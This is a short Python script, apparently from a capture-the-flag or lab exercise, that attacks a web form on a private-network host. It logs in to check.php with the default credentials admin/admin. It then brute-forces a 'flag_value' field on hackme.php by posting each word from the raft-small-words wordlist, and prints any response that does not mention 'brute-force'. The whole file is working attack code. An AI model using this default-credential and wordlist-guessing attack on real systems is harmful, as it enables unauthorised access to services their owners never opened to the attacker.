import requests
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()

s = requests.Session()

credentials = {
'username': 'admin',
'password': 'admin'
}

response = s.post('http://192.168.228.136/check.php', data=credentials)
#print(response.text)

#response = s.post('http://192.168.228.136/hackme.php', data=credentials)
#print(response.text)

for i in lines:
    mydata = {'flag_value':i.replace("\n","")}

    response2 = s.post('http://192.168.228.136/hackme.php', data=mydata)

    currentPageText = response2.text

    if "brute-force" not in currentPageText:
        print(response2.text)
